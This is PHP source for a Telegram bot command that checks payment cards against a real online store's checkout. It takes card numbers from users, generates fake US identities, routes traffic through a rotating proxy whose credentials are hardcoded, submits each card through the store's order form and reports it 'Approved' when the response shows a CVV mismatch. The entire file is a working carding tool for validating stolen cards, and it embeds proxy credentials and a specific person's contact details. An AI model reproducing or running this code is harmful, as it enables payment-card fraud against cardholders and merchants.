<?php


$gatewayname="pa";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
//==================[Inicializacion de variables]======================//
$messages = $bot->loadPlantillas();
$gateway = "#Payflow_Charged (".'$4'.")";
$lang = $db->getUserLanguage($userId);
//==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($year) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    

 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
    $lastFourDigits = substr($cc, -4);
 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
 $cookie = uniqid();
 
 $socks5 = "x.botproxy.net:8080";
 $rotate = "pxu41762-0:cuvtwTC1VNEbVwViwf4A";
 
 $proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];
 

 //==================[Curl Request]======================//


 $response = CurlX::Get(
    "https://www.kpodj.com/gravity-stands-ss-018-spigot--bolt-m10-for-scp710b-super-clamp-p-113979",
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'referer: https://www.kpodj.com/other-accessories-c-125_57/',
        'sec-fetch-dest: document',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0'
    ],
    $cookie,
    $proxies
);
$crf=CurlX::ParseString($response->body,' name="csrf-token" content="','"');

$response = CurlX::Get(
    "https://www.kpodj.com/get-extend-product-protection-offers/113979",
    [
        'accept: */*',
        'accept-language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'referer: https://www.kpodj.com/gravity-stands-ss-018-spigot--bolt-m10-for-scp710b-super-clamp-p-113979',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
        'x-csrf-token: '.$crf.'',
        'x-requested-with: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);


$response = CurlX::Get(
    "https://www.kpodj.com/products/add_to_viewcart?id=113979&options[0]=277193&options[1]=277188&plan=",
    [
        'accept: */*',
        'accept-language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'referer: https://www.kpodj.com/gravity-stands-ss-018-spigot--bolt-m10-for-scp710b-super-clamp-p-113979',
        'sec-fetch-dest: empty',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
        'x-csrf-token: '.$crf.'',
        'x-requested-with: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);


$response = CurlX::Get(
    "https://www.kpodj.com/checkout",
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'referer: https://www.kpodj.com/cart',
        'sec-fetch-dest: document',
        'upgrade-insecure-requests: 1',
    ],
    $cookie,
    $proxies
);
echo $response = gzdecode($response->body);
echo $token=CurlX::ParseString($response,'name="_token" value="','"');
$response = CurlX::Post(
    "https://www.kpodj.com/checkout",
    '_token='.$token.'&data%5BAddress%5D%5Bcountry%5D=United+States&data%5BUser%5D%5Bfirst_name%5D=alex&data%5BUser%5D%5Blast_name%5D=frick&data%5Bbilling_address%5D=0&data%5BAddress%5D%5Bid%5D=&data%5BAddress%5D%5Baddress%5D=2557+Moore+Avenue&data%5BAddress%5D%5Baddress2%5D=&data%5BAddress%5D%5Bcity%5D=Dallas&data%5BAddress%5D%5Bstate%5D=TX&data%5BAddress%5D%5Bzip%5D=75201&data%5BUser%5D%5Bphone_number%5D=2145029602&data%5BUser%5D%5Bemail%5D=al0xhhh%40gmail.com&emailflag=0&RadioGroup2=yes&data%5BBill%5D%5Baddress%5D=&data%5BBill%5D%5Baddress2%5D=&data%5BBill%5D%5Bcity%5D=&data%5BBill%5D%5Bstate%5D=&data%5BBill%5D%5Bzip%5D=&data%5BORIGID%5D=&data%5BOrder%5D%5Bcard_type%5D=MasterCard&data%5BOrder%5D%5Bcard_number%5D='.$cc.'&data%5BOrder%5D%5Bcard_exp_mo%5D='.$mes.'&data%5BOrder%5D%5Bcard_exp_yr%5D='.$ano1.'&data%5BOrder%5D%5Bcvv2_code%5D='.$cvv.'&data%5BOrder%5D%5Bterms%5D=1&data%5BOrder%5D%5Bterms_icheck%5D=1&chkout=PLACE+MY+ORDER',
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://www.kpodj.com/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);



 //==================[Manejo de los mensajes]======================//
 if ($response->body) {
    if (substr($response->body, 0, 2) == "\x1f\x8b") {
        $response = gzdecode($response->body);
    }
}
$errormessage=CurlX::ParseString($response,'<div class="checkout-messages col-sm-12" style="clear:both">','<');

if($errormessage=="null"||!$errormessage){
    $errormessage = "There was a problem processing the request";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
} 
 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//
 if($errormessage == "Authorization Failure: CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number."){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        
        $bot->translateText("Declined!❌", "en", $lang),
        $errormessage,
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
